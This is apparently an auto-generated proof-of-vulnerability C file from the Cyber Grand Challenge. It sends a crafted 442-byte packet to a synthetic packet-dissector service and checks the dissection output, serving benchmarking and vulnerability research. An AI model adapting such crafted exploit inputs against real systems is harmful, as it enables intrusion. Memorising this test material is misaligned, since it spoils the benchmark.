#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xba\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\xa2\x01\x00\x00\x9a\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x9a\x01\x00\x00"
         "\xbe\x09\x62\xe3\x0b\xda\xa1\xa7\x97\x13\xda\x2f\x6f\xc1\x48\xe4"
         "\x5a\x5f\x7b\xd1\x01\x00\x00\x00\x5f\xa7\x78\x64\x38\x97\xfe\xe9"
         "\x01\xdf\xff\x41\x00\x5e\x42\x1a\xff\xff\x8d\x4f\x77\x19\x6b\x71"
         "\x8c\x1d\x86\x38\x38\xb7\xf1\x70\x41\xc4\x01\x00\xa3\x9c\x81\x69"
         "\x63\xff\x01\x00\xd2\x41\x00\x52\x58\xd0\x58\xea\xa5\xda\x51\x02"
         "\xdc\x39\x3c\xe9\x9f\x8d\x34\x73\x94\xa1\x91\x67\xcf\xbe\x2d\xff"
         "\xff\xa5\x2e\x29\x86\xb5\x18\xbe\x88\x1b\x06\x36\x12\x85\x75\xf6"
         "\xa4\x32\x41\x00\xf5\xc6\x76\xe2\xb7\xe9\x20\xa1\x50\x84\xaf\xdd"
         "\xec\x0a\x15\xf9\xff\xc2\x2f\xf6\xff\xaf\xea\x77\xe1\xd7\xf5\x29"
         "\xc6\x36\x74\x06\x46\x4b\x51\xb0\x19\xf4\x07\x12\x4a\xce\x78\x64"
         "\x07\xc8\xc3\x7b\xd5\x3e\x2f\x2d\x64\x4f\x2b\x4e\x44\xb8\x34\xbe"
         "\x62\x0f\xba\xff\xf1\xfd\xbe\x00\x46\x9d\xbc\xd4\x11\x37\xa5\x4a"
         "\xd2\xf5\xb7\x7b\x43\xe0\x9e\x16\x61\x90\x84\xb5\x39\x28\x6b\x9b"
         "\x2b\x06\x27\x48\xf1\xaa\x4f\x26\x10\xec\xbf\x63\xb1\x13\xc0\x2d"
         "\xb7\xc9\x11\xef\x9b\xff\x6a\xe7\xa6\x8c\x5f\xc4\xa3\x73\xc8\x76"
         "\xcf\x1e\xa8\xac\x00\x2e\x8e\x66\xb8\x09\x94\xfc\xb7\x03\x8a\xef"
         "\x45\x47\x12\x8b\xa6\x0d\xf5\xf0\x36\xf4\x70\x4e\x79\x99\x23\x70"
         "\xc0\xd2\x7b\x3d\x7d\xb1\xa5\x5a\x1d\xe0\x14\x9b\x95\xc8\xda\xc0"
         "\xf1\x0a\x3c\x96\xfe\x1c\x41\x90\x9f\x9d\xce\x81\xcb\x90\xf1\x71"
         "\xe4\x4e\xd2\x58\xe8\x71\xfc\x16\xf4\xa9\xc6\xa6\x0c\x64\xfb\x0a"
         "\xbf\x75\xff\x1e\xbb\xbe\xd8\x1f\x92\x95\x0f\x19\x61\xbd\x15\x29"
         "\x93\xcf\xd1\xc2\x87\xc8\xa8\x47\x93\x3c\x7e\xf9\xce\x32\xbc\x3a"
         "\xf8\x1e\xe0\xdc\x57\x11\x89\xdc\xca\x90\x8a\x06\xa6\xbd\x6a\x34"
         "\xc6\xbc\xba\x69\x8d\x4a\x86\xe8\x7d\x0a\xfc\x8d\x04\x4a\xa6\x71"
         "\xbb\x94\xa1\xa8\x38\xf1\x9a\x6d\xc1\xbb\xc4\x26\xff\xff\x01\xac"
         "\x2a\x53\xc3\xad\x09\xd4\x8f\x46\xcd\x1c";
      static unsigned int write_00001_00000_len = 442;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaantioxygen
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x61\x6e\x74\x69\x6f\x78"
         "\x79\x67\x65\x6e";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
